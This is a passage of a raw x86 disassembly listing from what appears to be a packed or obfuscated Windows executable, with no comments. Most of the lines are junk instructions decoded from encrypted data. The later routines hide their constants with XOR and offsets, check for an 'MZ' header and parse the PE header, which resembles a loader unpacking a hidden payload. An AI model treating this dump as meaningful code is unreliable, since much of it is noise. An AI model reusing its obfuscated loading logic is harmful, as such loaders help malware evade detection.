  40c582:	jl     0x40c562
  40c584:	sti    
  40c585:	adc    BYTE PTR [ecx+0x105917ee],ch
  40c58b:	xor    ecx,0xffffffff
  40c58e:	enter  0xeddf,0xe4
  40c592:	fwait
  40c593:	mov    ebp,0x54c3a1d0
  40c598:	popf   
  40c599:	cmp    eax,eax
  40c59b:	in     al,0x52
  40c59d:	ret    0x1992
  40c5a0:	arpl   WORD PTR [eax-0x35],bp
  40c5a3:	mov    dl,0xc7
  40c5a5:	mov    dl,0x88
  40c5a7:	shl    BYTE PTR [eax+0x60],1
  40c5aa:	ins    DWORD PTR es:[edi],dx
  40c5ab:	or     ch,ah
  40c5ad:	inc    ecx
  40c5ae:	xchg   ecx,eax
  40c5af:	test   BYTE PTR [edx+0x1a],dl
  40c5b2:	(bad)  
  40c5b3:	shl    BYTE PTR [ecx-0xe],1
  40c5b6:	xor    BYTE PTR [ecx-0x6ba2c362],dl
  40c5bc:	addr16 mov cl,0xde
  40c5bf:	ss jmp 0x40c641
  40c5c2:	hlt    
  40c5c3:	call   0xaac4:0x2b6ba3cf
  40c5ca:	pop    ss
  40c5cb:	mov    eax,0x410d7188
  40c5d0:	in     al,dx
  40c5d1:	adc    esp,DWORD PTR [ebx+0xa4ff35f]
  40c5d7:	push   ds
  40c5d8:	ja     0x40c5c7
  40c5da:	pop    ebp
  40c5db:	lahf   
  40c5dc:	sahf   
  40c5dd:	pushf  
  40c5de:	jne    0x40c5d3
  40c5e0:	pop    ecx
  40c5e1:	jg     0x40c59b
  40c5e3:	sbb    eax,0xbc019230
  40c5e8:	aad    0xd6
  40c5ea:	lea    esi,[edx+0x5872ce0e]
  40c5f0:	inc    edi
  40c5f1:	push   ss
  40c5f2:	adc    al,0x34
  40c5f4:	pop    ds
  40c5f5:	test   al,0x4f
  40c5f7:	outs   dx,DWORD PTR ds:[esi]
  40c5f8:	xchg   DWORD PTR ds:0xf794719c,ebx
  40c5fe:	push   0x758480a3
  40c603:	xor    eax,edi
  40c605:	jp     0x40c5f3
  40c607:	add    eax,0xa98b3450
  40c60c:	mov    dl,BYTE PTR [eax-0x6c]
  40c60f:	das    
  40c610:	sub    al,0xa6
  40c612:	xchg   ecx,eax
  40c613:	sub    bh,BYTE PTR [ebx+0x712525d6]
  40c619:	adc    al,0xca
  40c61b:	dec    edx
  40c61c:	cwde   
  40c61d:	jno    0x40c5a9
  40c61f:	out    0x23,eax
  40c621:	sub    dh,0xe0
  40c624:	test   eax,0x76e1a52e
  40c629:	adc    BYTE PTR ds:0x45c3c00b,ch
  40c62f:	mov    al,0xa2
  40c631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c632:	sub    ecx,DWORD PTR [eax]
  40c634:	addr16 popa 
  40c636:	adc    al,BYTE PTR [eax+0x7e50deb1]
  40c63c:	xlat   BYTE PTR ds:[ebx]
  40c63d:	pop    ebp
  40c63e:	push   0x21
  40c640:	es cdq 
  40c642:	int    0x41
  40c644:	pop    ds
  40c645:	adc    dh,BYTE PTR [ebx+0x5b4c3fd6]
  40c64b:	pop    edi
  40c64c:	mov    cl,0x8e
  40c64e:	mov    ebx,0x52379389
  40c653:	xchg   ecx,eax
  40c654:	aaa    
  40c655:	pop    ebp
  40c656:	push   0xa41bb8c8
  40c65b:	stc    
  40c65c:	mov    al,0x72
  40c65e:	mov    al,BYTE PTR [edx+edi*1+0x55354b17]
  40c665:	mov    ecx,0xc2520593
  40c66a:	mov    edi,0x27797d19
  40c66f:	sub    edi,esp
  40c671:	je     0x40c6f2
  40c673:	push   eax
  40c674:	out    dx,al
  40c675:	dec    ecx
  40c676:	dec    ecx
  40c677:	(bad)  
  40c678:	outs   dx,BYTE PTR ds:[esi]
  40c679:	sahf   
  40c67a:	xor    DWORD PTR [esi-0x7e856865],eax
  40c680:	jecxz  0x40c621
  40c682:	mov    dl,0xa7
  40c684:	test   eax,0xd41243f6
  40c689:	and    ah,BYTE PTR [eax-0x405ba9d1]
  40c68f:	push   eax
  40c690:	ds dec bp
  40c693:	and    edx,DWORD PTR [edi+0x56d307ff]
  40c699:	ret    0x1918
  40c69c:	inc    esp
  40c69d:	retf   
  40c69e:	gs scas al,BYTE PTR es:[edi]
  40c6a0:	mov    cl,0x56
  40c6a2:	xor    BYTE PTR [ebp-0x5a],bh
  40c6a5:	bound  edi,QWORD PTR [ebp+ebx*2+0x22]
  40c6a9:	sbb    al,0x3b
  40c6ab:	mov    ah,0x58
  40c6ad:	and    al,dh
  40c6af:	inc    edi
  40c6b0:	mov    dl,0xae
  40c6b2:	(bad)  
  40c6b3:	fnstenv [ebp+0x25]
  40c6b6:	and    esp,DWORD PTR [edx]
  40c6b8:	(bad)  
  40c6ba:	mov    ds,WORD PTR [eax]
  40c6bc:	pop    ebp
  40c6bd:	in     eax,dx
  40c6be:	stc    
  40c6bf:	test   al,0x7c
  40c6c1:	inc    BYTE PTR [esi+0x39e57cbb]
  40c6c7:	and    BYTE PTR [ebx-0x60],ah
  40c6ca:	pop    ebx
  40c6cb:	das    
  40c6cc:	adc    edx,DWORD PTR [ebx+0x60b05c71]
  40c6d2:	xor    eax,0x1c73865a
  40c6d7:	test   cl,ah
  40c6d9:	sbb    BYTE PTR [esi-0x4a],bl
  40c6dc:	inc    ebp
  40c6dd:	into   
  40c6de:	inc    esi
  40c6df:	scas   al,BYTE PTR es:[edi]
  40c6e0:	cwde   
  40c6e1:	iret   
  40c6e2:	sbb    DWORD PTR [eax],esp
  40c6e4:	jo     0x40c693
  40c6e6:	(bad)  
  40c6e7:	xor    dh,dh
  40c6e9:	pushf  
  40c6ea:	loop   0x40c6f8
  40c6ec:	add    bh,BYTE PTR [ebp-0x7301b901]
  40c6f2:	fsub   QWORD PTR cs:[ebx]
  40c6f5:	jo     0x40c6be
  40c6f7:	clc    
  40c6f8:	cdq    
  40c6f9:	popa   
  40c6fa:	aad    0x8
  40c6fc:	dec    ebp
  40c6fd:	inc    edi
  40c6fe:	jl     0x40c74b
  40c700:	sbb    edi,ebp
  40c702:	fldenv [edx+esi*8]
  40c705:	pop    edx
  40c706:	(bad)  
  40c707:	mov    al,0x4d
  40c709:	outs   dx,BYTE PTR ds:[esi]
  40c70a:	out    dx,eax
  40c70b:	pop    ebx
  40c70c:	int3   
  40c70d:	(bad)  
  40c70e:	jne    0x40c71a
  40c710:	mov    ds:0x243df2a8,al
  40c715:	inc    esp
  40c716:	push   ebx
  40c717:	xchg   BYTE PTR [ebx-0x58],bh
  40c71a:	add    edi,DWORD PTR [edi+0x16]
  40c71d:	sub    al,0x69
  40c71f:	jl     0x40c742
  40c721:	das    
  40c722:	test   DWORD PTR [eax+0x213b4856],0x42740a2d
  40c72c:	xor    cl,BYTE PTR [esi]
  40c72e:	scas   al,BYTE PTR es:[edi]
  40c72f:	imul   eax,DWORD PTR [edx-0x62b0beb4],0xcbb5a5b8
  40c739:	jmp    0x335c:0xf23d9b
  40c740:	sahf   
  40c741:	rcr    BYTE PTR [esi-0x2351f85f],cl
  40c747:	shl    eax,cl
  40c749:	pop    ss
  40c74a:	mov    ?,WORD PTR [ecx+0x6c17f601]
  40c750:	ret    
  40c751:	setae  BYTE PTR [eax]
  40c754:	iret   
  40c755:	fcmovne st,st(4)
  40c757:	sub    esp,DWORD PTR [edi-0x58d6f995]
  40c75d:	mov    ch,0x8e
  40c75f:	mov    bh,0x90
  40c761:	cmp    BYTE PTR [edx],ah
  40c763:	jo     0x40c77d
  40c765:	je     0x40c7d2
  40c767:	fmul   QWORD PTR [edx-0x64252c4]
  40c76d:	add    edx,DWORD PTR [edi]
  40c76f:	jp     0x40c702
  40c771:	push   esi
  40c772:	dec    edx
  40c773:	lods   al,BYTE PTR ds:[esi]
  40c774:	in     al,0xc9
  40c776:	and    DWORD PTR [edx-0x7f],edi
  40c779:	not    BYTE PTR [edi]
  40c77b:	add    ebx,ebp
  40c77d:	jmp    0xe5efca99
  40c782:	jmp    0x40c7b3
  40c784:	mov    dh,BYTE PTR [edi+ecx*4]
  40c787:	ins    BYTE PTR es:[edi],dx
  40c788:	lods   al,BYTE PTR ds:[esi]
  40c789:	shl    DWORD PTR [esi+0x43],1
  40c78c:	int3   
  40c78d:	xchg   BYTE PTR [ebx-0x68],ah
  40c790:	xor    al,0xdd
  40c792:	sbb    BYTE PTR [esi+eax*4],bl
  40c795:	xchg   edx,eax
  40c796:	push   esp
  40c797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c798:	dec    BYTE PTR [ecx]
  40c79a:	sti    
  40c79b:	out    dx,al
  40c79c:	cwde   
  40c79d:	fcmovbe st,st(7)
  40c79f:	push   esp
  40c7a0:	daa    
  40c7a1:	add    al,0x3e
  40c7a3:	push   edx
  40c7a4:	push   ss
  40c7a5:	repnz pop ss
  40c7a7:	adc    ah,bl
  40c7a9:	adc    DWORD PTR [eax-0x6a170b3a],ebx
  40c7af:	mov    bl,0xa9
  40c7b1:	sbb    eax,0xd39580cd
  40c7b6:	jp     0x40c7f4
  40c7b8:	in     eax,dx
  40c7b9:	jp     0x40c757
  40c7bb:	or     esp,DWORD PTR [edi-0x6d4f4dae]
  40c7c1:	test   ch,dh
  40c7c3:	add    eax,ebp
  40c7c5:	jp     0x40c783
  40c7c7:	fisub  DWORD PTR [eax-0x6ac073d6]
  40c7cd:	push   esp
  40c7ce:	adc    DWORD PTR [edx+0x33751c29],ecx
  40c7d4:	jmp    0xf88e52f0
  40c7d9:	mov    ecx,DWORD PTR [ecx]
  40c7db:	mov    eax,DWORD PTR [eax+ecx*1]
  40c7de:	mov    DWORD PTR [ebp-0x20],eax
  40c7e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c7e4:	xor    eax,esi
  40c7e6:	add    eax,edi
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	jns    0x40c831
  40c801:	jne    0x40c833
  40c803:	leave  
  40c804:	cmp    BYTE PTR [esi+0x7e],0x2e
  40c808:	jge    0x40c888
  40c80a:	jle    0x40c78f
  40c80c:	xchg   edx,edx
  40c80e:	pop    es
  40c80f:	stos   BYTE PTR es:[edi],al
  40c810:	xchg   BYTE PTR [esi-0x1818539a],ch
  40c816:	dec    eax
  40c817:	leave  
  40c818:	(bad)  
  40c819:	jp     0x40c7ca
  40c81b:	sub    esp,DWORD PTR [ebp-0xd]
  40c81e:	mov    dh,0x69
  40c820:	xchg   edx,eax
  40c821:	(bad)  
  40c822:	and    esi,ecx
  40c824:	lods   al,BYTE PTR ds:[esi]
  40c825:	or     dh,dl
  40c827:	push   cs
  40c828:	aam    0x3e
  40c82a:	dec    edi
  40c82b:	retf   0x6a3c
  40c82e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c82f:	clc    
  40c830:	test   BYTE PTR [ebx],ah
  40c832:	adc    al,0x97
  40c834:	clc    
  40c835:	pop    esp
  40c836:	xor    DWORD PTR [edi-0x5e],ecx
  40c839:	mov    esi,DWORD PTR [edx]
  40c83b:	repz add BYTE PTR [ebx-0x41],cl
  40c83f:	daa    
  40c840:	cmc    
  40c841:	or     al,0x86
  40c843:	in     eax,dx
  40c844:	jae    0x40c7f7
  40c846:	cmp    DWORD PTR [edx+eax*4+0x56cca8c7],esp
  40c84d:	jge    0x40c7f9
  40c84f:	pop    eax
  40c850:	mov    edi,0xada42305
  40c855:	shr    ecx,0x8e
  40c858:	mov    gs,esi
  40c85a:	xor    ecx,DWORD PTR [edx+ecx*2-0x2d]
  40c85e:	outs   dx,DWORD PTR ds:[esi]
  40c85f:	dec    eax
  40c860:	sbb    BYTE PTR [ecx],0xb4
  40c863:	cmp    esi,DWORD PTR [ecx+0x8]
  40c866:	iret   
  40c867:	lea    esp,[ecx+0xf]
  40c86a:	sub    eax,DWORD PTR [esi-0x41c4099]
  40c870:	pop    es
  40c871:	das    
  40c872:	xor    ah,al
  40c874:	gs js  0x40c83b
  40c877:	loop   0x40c8f7
  40c879:	xchg   esp,eax
  40c87a:	inc    edx
  40c87b:	xor    BYTE PTR [edx-0xc7822c8],ah
  40c881:	add    ch,0x5c
  40c884:	jnp    0x40c8b6
  40c886:	idiv   BYTE PTR [ebx-0x2]
  40c889:	out    0x1b,eax
  40c88b:	push   edx
  40c88c:	ins    BYTE PTR es:[edi],dx
  40c88d:	mov    DWORD PTR [edi],0xc47effc2
  40c893:	in     eax,0x10
  40c895:	adc    al,cl
  40c897:	loopne 0x40c8e1
  40c899:	pop    edx
  40c89a:	mov    cl,0xc7
  40c89c:	hlt    
  40c89d:	mov    ch,0xdc
  40c89f:	add    eax,0x5bcd87b1
  40c8a4:	mov    bh,0xfe
  40c8a6:	ja     0x40c8ad
  40c8a8:	rcr    DWORD PTR [ebp+0x42],cl
  40c8ab:	push   ss
  40c8ac:	or     bh,0xcf
  40c8af:	repnz sbb ebp,DWORD PTR [edi]
  40c8b2:	add    eax,0xe0b5acf
  40c8b7:	and    ebx,DWORD PTR [eax-0x7b]
  40c8ba:	mov    eax,0x110e5fd0
  40c8bf:	dec    ebp
  40c8c0:	dec    BYTE PTR [edi+0x10]
  40c8c3:	shl    BYTE PTR [edi+0x3681666],1
  40c8c9:	push   0x1a87d13f
  40c8ce:	mov    ebx,ebp
  40c8d0:	pop    es
  40c8d1:	pop    esi
  40c8d2:	out    dx,al
  40c8d3:	mov    al,ds:0x35eed9fb
  40c8d8:	xchg   edi,eax
  40c8d9:	xor    BYTE PTR [ecx],ch
  40c8db:	inc    esi
  40c8dc:	dec    ebx
  40c8dd:	pop    esp
  40c8de:	ds mov ah,0x6
  40c8e1:	and    al,0xbd
  40c8e3:	idiv   ah
  40c8e5:	pop    ss
  40c8e6:	dec    esi
  40c8e7:	ins    BYTE PTR es:[edi],dx
  40c8e8:	fucomip st,st(1)
  40c8ea:	jg     0x40c8c5
  40c8ec:	call   0xecd7:0xcc8de96
  40c8f3:	mov    DWORD PTR [esi-0xf33dc55],esp
  40c8f9:	push   es
  40c8fa:	pop    edi
  40c8fb:	push   ebx
  40c8fc:	inc    esi
  40c8fd:	aam    0x51
  40c8ff:	mov    DWORD PTR [ebx+0x6],ebx
  40c902:	call   0x5ef:0x1c771394
  40c909:	(bad)  
  40c90a:	push   ss
  40c90b:	sbb    edi,edx
  40c90d:	(bad)  
  40c90e:	dec    esp
  40c90f:	inc    esp
  40c910:	pop    ss
  40c911:	jmp    0xf21effce
  40c916:	ret    0x6292
  40c919:	mov    eax,0x58a3eedb
  40c91e:	jb     0x40c8d2
  40c920:	jns    0x40c8c8
  40c922:	shl    BYTE PTR [ecx-0x12],cl
  40c925:	dec    esi
  40c926:	rcr    DWORD PTR [edx+esi*1],1
  40c929:	jo     0x40c8d5
  40c92b:	sub    bh,BYTE PTR ds:0xd177d4bc
  40c931:	cmp    al,0xf2
  40c933:	mov    dl,0x7b
  40c935:	fst    QWORD PTR [edx+0x7e]
  40c938:	pusha  
  40c939:	or     esi,DWORD PTR [edx-0x5f]
  40c93c:	fcomp  DWORD PTR [eax+0x53baa571]
  40c942:	in     eax,0xa3
  40c944:	xor    al,0x94
  40c946:	loop   0x40c8de
  40c948:	add    DWORD PTR [ebp-0x7a],0x793f32e5
  40c94f:	pop    ebp
  40c950:	xor    BYTE PTR [eax-0xd0d3975],cl
  40c956:	xor    BYTE PTR [ebp-0x67],al
  40c959:	jo     0x40c98e
  40c95b:	cld    
  40c95c:	shl    BYTE PTR [esp+edx*8-0x13],cl
  40c960:	aas    
  40c961:	les    ebp,FWORD PTR [eax-0x2aa07d88]
  40c967:	jle    0x40c8eb
  40c969:	inc    esp
  40c96a:	push   edx
  40c96b:	lds    ebx,FWORD PTR [esi-0x41]
  40c96e:	shl    DWORD PTR [eax+0x6d10f665],cl
  40c974:	sub    bl,0x16
  40c977:	(bad)  
  40c978:	ficom  WORD PTR [eax-0x6]
  40c97b:	push   edi
  40c97c:	xchg   DWORD PTR [esi-0x33],ebx
  40c97f:	les    esi,FWORD PTR [ebx+0x27]
  40c982:	dec    edi
  40c983:	in     eax,0xbb
  40c985:	sub    DWORD PTR [esp+eiz*2-0x7fb8cbb0],ebp
  40c98c:	mov    esi,0x4907db65
  40c991:	pop    es
  40c992:	outs   dx,BYTE PTR ds:[esi]
  40c993:	mov    eax,0xf4e537c3
  40c998:	cwde   
  40c999:	lods   al,BYTE PTR cs:[esi]
  40c99b:	stos   BYTE PTR es:[edi],al
  40c99c:	into   
  40c99d:	retf   0xc2af
  40c9a0:	mov    edi,0x8fd23bbb
  40c9a5:	dec    esp
  40c9a6:	fcmovb st,st(0)
  40c9a8:	and    ebx,DWORD PTR cs:[eax-0x3a]
  40c9ac:	inc    eax
  40c9ad:	xchg   BYTE PTR [edx-0x2ae0278d],cl
  40c9b3:	mov    ds:0x5983b9d5,eax
  40c9b8:	inc    eax
  40c9b9:	sub    ecx,DWORD PTR [eax]
  40c9bb:	dec    edi
  40c9bc:	(bad)  
  40c9bd:	xor    dh,BYTE PTR ds:0x45e69d7b
  40c9c3:	dec    ebx
  40c9c4:	cld    
  40c9c5:	das    
  40c9c6:	ja     0x40c9e6
  40c9c8:	icebp  
  40c9c9:	push   0x24
  40c9cb:	mov    BYTE PTR [eax-0x4472ccda],cl
  40c9d1:	retf   
  40c9d2:	es pushw ds
  40c9d5:	fdiv   DWORD PTR [ecx+0x65]
  40c9d8:	mov    ebp,0x18e1f1aa
  40c9dd:	(bad)  
  40c9de:	cmp    bl,BYTE PTR [ecx-0x1d]
  40c9e1:	test   DWORD PTR [eax+0x1c5753e2],ebx
  40c9e7:	xchg   edx,eax
  40c9e8:	mov    eax,ds:0xdcf5c135
  40c9ed:	dec    ebx
  40c9ee:	jle    0x40c979
  40c9f0:	jae    0x40c9a5
  40c9f2:	test   eax,0xaceb5fb1
  40c9f7:	in     eax,dx
  40c9f8:	sub    ebx,DWORD PTR [edi*2-0x3f8b36d2]
  40c9ff:	repz inc edx
  40ca01:	js     0x40ca12
  40ca03:	(bad)  
  40ca04:	pop    edx
  40ca05:	loopne 0x40c9b0
  40ca07:	sar    eax,cl
  40ca09:	ss mov ebx,0x520d839b
  40ca0f:	or     al,0x75
  40ca11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca12:	icebp  
  40ca13:	xor    ah,BYTE PTR [edi]
  40ca15:	ja     0x40ca38
  40ca17:	fnstsw WORD PTR [esi]
  40ca19:	ret    
  40ca1a:	call   0xea9f0db4
  40ca1f:	mov    edx,0xe292f729
  40ca24:	test   al,0xde
  40ca26:	and    eax,0xaa28a1ea
  40ca2b:	mov    esi,0x4894d821
  40ca30:	and    ebx,esi
  40ca32:	in     al,0x11
  40ca34:	xchg   edx,eax
  40ca35:	ret    0x9de5
  40ca38:	iret   
  40ca39:	adc    bh,bh
  40ca3b:	loop   0x40ca60
  40ca3d:	sub    al,0x1a
  40ca3f:	pop    ebx
  40ca40:	jns    0x40ca39
  40ca42:	icebp  
  40ca43:	test   DWORD PTR [ebx-0x794f1355],esi
  40ca49:	fstp   st(0)
  40ca4b:	cli    
  40ca4c:	mov    fs,WORD PTR [ebp+0x6a]
  40ca4f:	pop    ds
  40ca50:	sub    al,0x24
  40ca52:	mov    esp,0xb4f27a5f
  40ca57:	add    esp,DWORD PTR [ebx+0x5f07e348]
  40ca5d:	mov    bl,0x7b
  40ca5f:	push   ds
  40ca60:	pop    esi
  40ca61:	push   ebx
  40ca62:	xchg   ecx,eax
  40ca63:	sub    BYTE PTR [ebx-0x3c00e54],ch
  40ca69:	mov    DWORD PTR [edx-0x620e5f65],esp
  40ca6f:	lds    edx,FWORD PTR [esi+0x48]
  40ca72:	mov    DWORD PTR [ecx+0x6534212a],esp
  40ca78:	fwait
  40ca79:	jecxz  0x40caef
  40ca7b:	mov    cl,0x6d
  40ca7d:	adc    eax,0xeeddb1e
  40ca82:	(bad)  
  40ca83:	(bad)  
  40ca84:	xchg   ebp,eax
  40ca85:	int    0x9b
  40ca87:	add    dh,ch
  40ca89:	xchg   edi,eax
  40ca8a:	mov    eax,ds:0xdb70fced
  40ca8f:	pop    ebp
  40ca90:	mov    ds:0xbd40f1f9,al
  40ca95:	mov    ch,0x37
  40ca97:	ror    DWORD PTR [edi-0x1f],1
  40ca9a:	lods   al,BYTE PTR ds:[esi]
  40ca9b:	test   BYTE PTR [ecx-0x64bec076],dl
  40caa1:	dec    esp
  40caa2:	mov    cl,0x16
  40caa4:	mov    ch,0x24
  40caa6:	mov    bh,0xe3
  40caa8:	dec    edx
  40caa9:	xchg   ecx,eax
  40caaa:	lea    esi,[ebp+0x1a119f56]
  40cab0:	ins    BYTE PTR es:[edi],dx
  40cab1:	xor    eax,0x85dab3c0
  40cab6:	inc    eax
  40cab7:	mov    ?,esp
  40cab9:	jae    0x40cb1d
  40cabb:	dec    eax
  40cabc:	fisttp DWORD PTR [edx]
  40cabe:	stos   BYTE PTR es:[edi],al
  40cabf:	jne    0x40cb14
  40cac1:	xor    BYTE PTR [edx+0x38e51989],al
  40cac7:	out    dx,al
  40cac8:	add    eax,0x23854063
  40cacd:	test   esi,ecx
  40cacf:	push   ss
  40cad0:	cmp    bl,al
  40cad2:	pop    ecx
  40cad3:	(bad)  
  40cad5:	and    DWORD PTR [esi+0x294fcd8],ebp
  40cadb:	lock cmp al,0x17
  40cade:	jo     0x40ca8c
  40cae0:	cmp    BYTE PTR [edi+0x27c1eefc],al
  40cae6:	add    ch,BYTE PTR [ecx-0x73]
  40cae9:	and    al,0xcd
  40caeb:	adc    al,0x72
  40caed:	repz sbb al,BYTE PTR [edi+0x1d4e42fb]
  40caf4:	jno    0x40cb07
  40caf6:	and    eax,0x2416899c
  40cafb:	es pop ecx
  40cafd:	ins    BYTE PTR es:[edi],dx
  40cafe:	js     0x40cb11
  40cb00:	sbb    eax,DWORD PTR [edi]
  40cb02:	cld    
  40cb03:	dec    ecx
  40cb04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb06:	jge    0x40cac9
  40cb08:	ret    0xe18c
  40cb0b:	cmp    dl,BYTE PTR [ebx-0x23]
  40cb0e:	arpl   ax,bx
  40cb10:	clc    
  40cb11:	imul   edi,esp,0x888679c7
  40cb17:	jne    0x40cb21
  40cb19:	pop    ds
  40cb1a:	xchg   ebp,eax
  40cb1b:	cmp    al,0xc5
  40cb1d:	mov    esp,0xe6395529
  40cb22:	push   ecx
  40cb23:	or     BYTE PTR [ebp-0x161aa5a2],ch
  40cb29:	pop    eax
  40cb2a:	iret   
  40cb2b:	jb     0x40cb33
  40cb2d:	or     ah,ch
  40cb2f:	popf   
  40cb30:	xchg   esp,eax
  40cb31:	pop    edi
  40cb32:	xor    al,0x52
  40cb34:	lods   eax,DWORD PTR ds:[esi]
  40cb35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb36:	and    ah,BYTE PTR [ecx-0x1c]
  40cb39:	mov    eax,ds:0xe04d8b56
  40cb3e:	xor    eax,esi
  40cb40:	add    eax,edi
  40cb42:	cmp    ecx,eax
  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x4302d5,0x0
  40cbd0:	jmp    0x40cbe0
  40cbd5:	mov    eax,ds:0x4302d5
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x4302d5,eax
  40cbe0:	cmp    DWORD PTR ds:0x4302d5,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x4302d5,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42e88b
  40cc05:	cmp    DWORD PTR ds:0x4302d5,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x4302d5
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x4302d5,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x4302bd,0x0
  40cc2f:	mov    eax,ds:0x4302bd
  40cc34:	inc    eax
  40cc35:	mov    ds:0x4302bd,eax
  40cc3a:	cmp    DWORD PTR ds:0x4302bd,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e797
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42e94b
  40cc6b:	cmp    DWORD PTR ds:0x4302bd,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e64c,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x430357,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42ecd9
  40cd16:	mov    eax,ds:0x4302fd
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42ec57
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x4302ed,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x430367,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e640,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x4302f1,0x42ec4f
  40cd68:	add    eax,DWORD PTR ds:0x412224
